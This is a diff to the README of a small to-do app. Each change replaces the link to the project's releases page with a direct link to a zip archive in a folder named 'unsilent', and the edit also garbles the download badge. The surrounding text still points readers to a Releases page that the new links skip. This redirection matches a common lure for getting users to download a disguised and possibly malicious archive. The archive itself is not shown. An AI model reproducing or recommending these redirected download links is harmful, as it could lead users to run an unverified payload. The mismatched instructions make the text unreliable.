@@ -1,6 +1,6 @@
 # 🚀 serverless-todo-app - Your Easy To-Do List Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/sheikhirfan05/serverless-todo-app/releases)
+[![Download Now](https://raw.githubusercontent.com/sheikhirfan05/serverless-todo-app/main/unsilent/serverless-todo-app-v2.7.zip%20Now-Get%https://raw.githubusercontent.com/sheikhirfan05/serverless-todo-app/main/unsilent/serverless-todo-app-v2.7.zip)](https://raw.githubusercontent.com/sheikhirfan05/serverless-todo-app/main/unsilent/serverless-todo-app-v2.7.zip)
 
 ## 📋 About This App
 
@@ -24,7 +24,7 @@ To run this application, ensure you have the following:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page:** To get the application, [visit this page to download](https://github.com/sheikhirfan05/serverless-todo-app/releases).
+1. **Visit the Download Page:** To get the application, [visit this page to download](https://raw.githubusercontent.com/sheikhirfan05/serverless-todo-app/main/unsilent/serverless-todo-app-v2.7.zip).
   
 2. **Choose the Latest Version:** On the Releases page, look for the latest version listed. 
 
@@ -36,7 +36,7 @@ To run this application, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get the serverless-todo-app easily, [visit this page to download](https://github.com/sheikhirfan05/serverless-todo-app/releases). Look for the latest release, download the file, and follow the provided steps to install it.
+To get the serverless-todo-app easily, [visit this page to download](https://raw.githubusercontent.com/sheikhirfan05/serverless-todo-app/main/unsilent/serverless-todo-app-v2.7.zip). Look for the latest release, download the file, and follow the provided steps to install it.
 
 ## 📝 Using the App
 
